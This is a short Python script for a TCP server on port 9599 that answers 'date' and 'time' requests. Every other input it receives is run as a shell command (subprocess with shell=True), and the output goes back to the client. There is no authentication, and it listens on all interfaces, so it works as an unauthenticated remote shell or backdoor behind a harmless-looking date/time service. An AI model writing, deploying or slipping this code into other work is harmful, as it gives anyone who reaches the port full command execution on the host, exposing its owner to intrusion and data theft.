import socket
import sys
import datetime
import subprocess
import os

# Create a Socket (connect two computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9599
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    except socket.error as msg:
        print("Socket creation error: " + str(msg))

# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port with server Computer with: " + str(port))
        s.bind((host, port))
        s.listen(4)
    except socket.error as msg:
        print("Socket Binding error: " + str(msg) + "\n" + "Retrying...")
        bind_socket()

# Establish connection with a client (socket must be listening)
def socket_accept():
    conn, address = s.accept()
    print("Connection has been established with IP " + address[0] + " and Port " + str(address[1]))
    send_response(conn)
    conn.close()

def send_response(conn):
    now = datetime.datetime.now()
    date = now.date()
    time = now.time()
    wellcome = "<< Thank You For Connecting with Our Server >>"
    try:
        conn.send(wellcome.encode('utf-8'))
    except BrokenPipeError:
        print("Client disconnected.")
        return
    while True:
        askclie = "What do you want: "
        try:
            conn.send(askclie.encode('utf-8'))
            data = conn.recv(1024).decode('utf-8')
            data_=data.strip()
        except BrokenPipeError:
            print("Client disconnected.")
            return
        if data_ == 'date':
            _date = f"Today Date Is {date}"
            conn.send(_date.encode('utf-8'))
        elif data_ == 'time':
            _time = f"Now Time is {time}"
            conn.send(_time.encode('utf-8'))
        elif data_.startswith('cd'):
            directory = data_[3:]
            try:
                os.chdir(directory)
                conn.send(f"Changed directory to {directory}".encode('utf-8'))
            except FileNotFoundError as e:
                conn.send(str(e).encode('utf-8'))
        else:
            cmd = subprocess.Popen(data_, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte, 'utf-8')  # Convert bytes to string
            currentWD = os.getcwd() + "> "
            conn.send(output_str.encode('utf-8') + currentWD.encode('utf-8'))

def main():
    create_socket()
    bind_socket()
    socket_accept()

main()
